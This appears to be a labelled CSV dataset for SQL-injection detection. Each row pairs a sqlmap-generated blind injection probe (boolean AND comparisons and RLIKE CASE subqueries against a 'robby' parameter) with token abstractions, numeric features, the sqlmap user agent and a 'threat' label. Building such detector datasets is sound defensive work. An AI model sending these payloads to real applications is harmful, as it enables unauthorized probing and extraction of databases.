robby'))) AND 7416=1861#,STR SQUT RPRN RPRN RPRN AND INT EQ INT HASH,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,54,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby'))) AND 9571=9571#,STR SQUT RPRN RPRN RPRN AND INT EQ INT HASH,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,54,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") AND 6626=2818#",STR DQUT RPRN AND INT EQ INT HASH,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"")) AND 7881=5030#",STR DQUT RPRN RPRN AND INT EQ INT HASH,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" AND 6170=3157#",STR DQUT AND INT EQ INT HASH,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,45,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%') AND 3958=2246#,STR PRCNT SQUT RPRN AND INT EQ INT HASH,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%') AND 9571=9571#,STR PRCNT SQUT RPRN AND INT EQ INT HASH,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%')) AND 2232=6617#,STR PRCNT SQUT RPRN RPRN AND INT EQ INT HASH,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,54,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%')) AND 9571=9571#,STR PRCNT SQUT RPRN RPRN AND INT EQ INT HASH,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,54,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%' AND 9571=9571#,STR PRCNT SQUT AND INT EQ INT HASH,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby%"" AND 9571=9571#",STR PRCNT DQUT AND INT EQ INT HASH,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby) AND 9748=1265#,STR RPRN AND INT EQ INT HASH,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,45,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby) AND 9571=9571#,STR RPRN AND INT EQ INT HASH,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,45,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby)) AND 3230=7005#,STR RPRN RPRN AND INT EQ INT HASH,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby))) AND 9631=7974#,STR RPRN RPRN RPRN AND INT EQ INT HASH,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby))) AND 9571=9571#,STR RPRN RPRN RPRN AND INT EQ INT HASH,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 9571=9571#,STR AND INT EQ INT HASH,0.8 1.0 1.0 1.0 1.0 0.8,42,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' AND 9037=6169,STR SQUT AND INT EQ INT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,45,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' AND 9719=9719,STR SQUT AND INT EQ INT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,45,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby') AND 1312=1301,STR SQUT RPRN AND INT EQ INT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby') AND 9719=9719,STR SQUT RPRN AND INT EQ INT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby')) AND 7545=8159,STR SQUT RPRN RPRN AND INT EQ INT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby')) AND 9719=9719,STR SQUT RPRN RPRN AND INT EQ INT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby'))) AND 1294=9643,STR SQUT RPRN RPRN RPRN AND INT EQ INT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,54,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") AND 4975=8847",STR DQUT RPRN AND INT EQ INT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") AND 9719=9719",STR DQUT RPRN AND INT EQ INT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"")) AND 9719=9719",STR DQUT RPRN RPRN AND INT EQ INT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" AND 5267=1618",STR DQUT AND INT EQ INT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,45,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" AND 9719=9719",STR DQUT AND INT EQ INT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,45,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%') AND 2342=7815,STR PRCNT SQUT RPRN AND INT EQ INT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%')) AND 7323=1076,STR PRCNT SQUT RPRN RPRN AND INT EQ INT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,54,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%')) AND 9719=9719,STR PRCNT SQUT RPRN RPRN AND INT EQ INT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,54,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%' AND 9719=9719,STR PRCNT SQUT AND INT EQ INT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby%"" AND 8576=3585",STR PRCNT DQUT AND INT EQ INT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby%"" AND 9719=9719",STR PRCNT DQUT AND INT EQ INT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby) AND 1861=9026,STR RPRN AND INT EQ INT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,45,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby)) AND 1991=5166,STR RPRN RPRN AND INT EQ INT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby)) AND 9719=9719,STR RPRN RPRN AND INT EQ INT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,48,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby))) AND 5483=6582,STR RPRN RPRN RPRN AND INT EQ INT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby))) AND 9719=9719,STR RPRN RPRN RPRN AND INT EQ INT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,51,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 3773=1389,STR AND INT EQ INT STR,0.8 1.0 1.0 1.0 1.0 0.8,42,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 9719=9719,STR AND INT EQ INT STR,0.8 1.0 1.0 1.0 1.0 0.8,42,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' RLIKE (SELECT (CASE WHEN (3470=3470) THEN 0x726f626279 ELSE 0x28 END))-- VZrC,STR SQUT RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END DSCMT STR,0.26666666666666666 0.3333333333333333 0.4 0.4666666666666667 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.4666666666666667 0.4 0.3333333333333333 0.26666666666666666,136,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby') RLIKE (SELECT (CASE WHEN (3470=3470) THEN 0x726f626279 ELSE 0x28 END)) AND ('CTkP'='CTkP,STR SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN SQUT STR SQUT EQ SQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,162,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby')) RLIKE (SELECT (CASE WHEN (3470=3470) THEN 0x726f626279 ELSE 0x28 END)) AND (('cPMz'='cPMz,STR SQUT RPRN RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.16666666666666666 0.20833333333333331 0.25 0.29166666666666663 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.29166666666666663 0.25 0.20833333333333331 0.16666666666666666,168,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby'))) RLIKE (SELECT (CASE WHEN (3041=1830) THEN 0x726f626279 ELSE 0x28 END)) AND ((('kJuL'='kJuL,STR SQUT RPRN RPRN RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.15384615384615385 0.19230769230769232 0.23076923076923078 0.2692307692307693 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.2692307692307693 0.23076923076923078 0.19230769230769232 0.15384615384615385,174,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby'))) RLIKE (SELECT (CASE WHEN (3470=3470) THEN 0x726f626279 ELSE 0x28 END)) AND ((('VfuY'='VfuY,STR SQUT RPRN RPRN RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.15384615384615385 0.19230769230769232 0.23076923076923078 0.2692307692307693 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.3076923076923077 0.2692307692307693 0.23076923076923078 0.19230769230769232 0.15384615384615385,174,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' RLIKE (SELECT (CASE WHEN (4179=3620) THEN 0x726f626279 ELSE 0x28 END)) AND 'NWkK'='NWkK,STR SQUT RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND SQUT STR SQUT EQ SQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,156,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' RLIKE (SELECT (CASE WHEN (3470=3470) THEN 0x726f626279 ELSE 0x28 END)) AND 'fCog'='fCog,STR SQUT RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND SQUT STR SQUT EQ SQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,156,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby') RLIKE (SELECT (CASE WHEN (8003=5711) THEN 0x726f626279 ELSE 0x28 END)) AND ('chpO' LIKE 'chpO,STR SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN SQUT STR SQUT LIKE SQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,169,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby')) RLIKE (SELECT (CASE WHEN (3359=5513) THEN 0x726f626279 ELSE 0x28 END)) AND (('IDzL' LIKE 'IDzL,STR SQUT RPRN RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN LPRN SQUT STR SQUT LIKE SQUT STR,0.16666666666666666 0.20833333333333331 0.25 0.29166666666666663 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.29166666666666663 0.25 0.20833333333333331 0.16666666666666666,175,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby')) RLIKE (SELECT (CASE WHEN (3470=3470) THEN 0x726f626279 ELSE 0x28 END)) AND (('ZrNk' LIKE 'ZrNk,STR SQUT RPRN RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN LPRN SQUT STR SQUT LIKE SQUT STR,0.16666666666666666 0.20833333333333331 0.25 0.29166666666666663 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.29166666666666663 0.25 0.20833333333333331 0.16666666666666666,175,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' RLIKE (SELECT (CASE WHEN (1325=5137) THEN 0x726f626279 ELSE 0x28 END)) AND 'CvGP' LIKE 'CvGP,STR SQUT RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND SQUT STR SQUT LIKE SQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,163,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby' RLIKE (SELECT (CASE WHEN (3470=3470) THEN 0x726f626279 ELSE 0x28 END)) AND 'ssqO' LIKE 'ssqO,STR SQUT RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND SQUT STR SQUT LIKE SQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,163,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") RLIKE (SELECT (CASE WHEN (3470=3470) THEN 0x726f626279 ELSE 0x28 END)) AND (""lyxj""=""lyxj",STR DQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN DQUT STR DQUT EQ DQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,162,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"")) RLIKE (SELECT (CASE WHEN (5933=9690) THEN 0x726f626279 ELSE 0x28 END)) AND ((""iSVU""=""iSVU",STR DQUT RPRN RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN LPRN DQUT STR DQUT EQ DQUT STR,0.16666666666666666 0.20833333333333331 0.25 0.29166666666666663 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.29166666666666663 0.25 0.20833333333333331 0.16666666666666666,168,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"")) RLIKE (SELECT (CASE WHEN (3470=3470) THEN 0x726f626279 ELSE 0x28 END)) AND ((""VPLL""=""VPLL",STR DQUT RPRN RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN LPRN DQUT STR DQUT EQ DQUT STR,0.16666666666666666 0.20833333333333331 0.25 0.29166666666666663 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.29166666666666663 0.25 0.20833333333333331 0.16666666666666666,168,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" RLIKE (SELECT (CASE WHEN (3821=5325) THEN 0x726f626279 ELSE 0x28 END)) AND ""nezb""=""nezb",STR DQUT RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND DQUT STR DQUT EQ DQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,156,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" RLIKE (SELECT (CASE WHEN (3470=3470) THEN 0x726f626279 ELSE 0x28 END)) AND ""myma""=""myma",STR DQUT RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND DQUT STR DQUT EQ DQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,156,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") RLIKE (SELECT (CASE WHEN (6742=7177) THEN 0x726f626279 ELSE 0x28 END)) AND (""yqjm"" LIKE ""yqjm",STR DQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN DQUT STR DQUT LIKE DQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,169,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"") RLIKE (SELECT (CASE WHEN (3470=3470) THEN 0x726f626279 ELSE 0x28 END)) AND (""KStG"" LIKE ""KStG",STR DQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN DQUT STR DQUT LIKE DQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,169,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" RLIKE (SELECT (CASE WHEN (5438=1702) THEN 0x726f626279 ELSE 0x28 END)) AND ""jIwL"" LIKE ""jIwL",STR DQUT RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND DQUT STR DQUT LIKE DQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,163,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%') RLIKE (SELECT (CASE WHEN (7931=7269) THEN 0x726f626279 ELSE 0x28 END)) AND ('%'=',STR PRCNT SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN HEX ELSE HEX END AND LPRN SQUT PRCNT SQUT EQ SQUT,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,160,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
